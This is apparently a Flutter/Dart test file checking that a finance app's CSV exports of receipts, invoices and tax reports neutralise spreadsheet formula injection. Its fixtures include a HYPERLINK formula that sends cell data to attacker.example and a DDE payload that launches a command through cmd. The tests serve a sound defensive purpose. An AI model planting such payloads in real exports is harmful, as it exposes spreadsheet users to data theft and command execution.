import 'package:csv/csv.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:t_aidy/core/services/export_service.dart';
import 'package:t_aidy/core/utils/csv_utils.dart';
import 'package:t_aidy/features/invoices/data/models/invoice_model.dart';
import 'package:t_aidy/features/receipt_scanning/data/datasources/tax_report_service.dart';
import 'package:t_aidy/features/receipt_scanning/domain/entities/receipt.dart';

void main() {
  group('CsvUtils.sanitizeCell', () {
    test('prefixes text starting with each formula trigger', () {
      for (final lead in ['=', '+', '-', '@', '\t', '\r']) {
        final value = '${lead}HYPERLINK("https://attacker.example/?d="&A1)';
        expect(CsvUtils.sanitizeCell(value), "'$value", reason: 'leading ${lead.codeUnitAt(0)}');
      }
    });

    test('leaves ordinary text, signed numbers and non-strings unchanged', () {
      expect(CsvUtils.sanitizeCell('Coop Italia'), 'Coop Italia');
      expect(CsvUtils.sanitizeCell('a=b'), 'a=b');
      expect(CsvUtils.sanitizeCell(''), '');
      expect(CsvUtils.sanitizeCell('-12.50'), '-12.50');
      expect(CsvUtils.sanitizeCell('+3'), '+3');
      expect(CsvUtils.sanitizeCell(-12.5), -12.5);
      expect(CsvUtils.sanitizeCell(null), isNull);
    });
  });

  group('CSV exporters', () {
    const payload = '=cmd|\' /C calc\'!A0';

    List<List<dynamic>> parse(String csv) =>
        const CsvToListConverter(shouldParseNumbers: false, eol: '\r\n').convert(csv);

    test('receipt export neutralizes merchant, description and address cells', () {
      final csv = ExportService.receiptsToCsv([
        Receipt(
          id: 'r1',
          merchantName: payload,
          merchantAddress: '@SUM(1+1)',
          date: DateTime.utc(2026, 9, 1),
          totalAmount: -4.5,
          currency: 'EUR',
          items: const [
            ReceiptItem(description: '+1+cmd', unitPrice: 4.5, quantity: 1, totalPrice: 4.5),
          ],
        ),
      ]);

      final row = parse(csv)[1];
      expect(row[2], "'$payload");
      expect(row[3], '-4.5');
      expect(row[6], "'+1+cmd");
      expect(row[12], "'@SUM(1+1)");
    });

    test('invoice export neutralizes client name and notes', () {
      final csv = ExportService.invoicesToCsv([
        InvoiceModel(
          id: 'i1',
          invoiceNumber: 'INV-1',
          clientName: payload,
          amount: 10,
          status: 'pending',
          issuedDate: DateTime.utc(2026, 9, 1),
          notes: '-2+3',
        ),
      ]);

      final row = parse(csv)[1];
      expect(row[1], "'$payload");
      expect(row[7], "'-2+3");
    });

    test('tax report export neutralizes merchant names', () {
      final report = TaxReportService.generateTaxReport(receipts: [
        Receipt(
          id: 'r1',
          merchantName: payload,
          date: DateTime.now(),
          totalAmount: 12.2,
          currency: 'EUR',
          items: const [
            ReceiptItem(description: 'Item', unitPrice: 12.2, quantity: 1, totalPrice: 12.2),
          ],
        ),
      ]);

      final csv = TaxReportService.exportToCsv(report);

      expect(csv, contains("'$payload"));
      expect(parse(csv).any((row) => row.isNotEmpty && row.first.toString().startsWith('=')), isFalse);
    });
  });
}
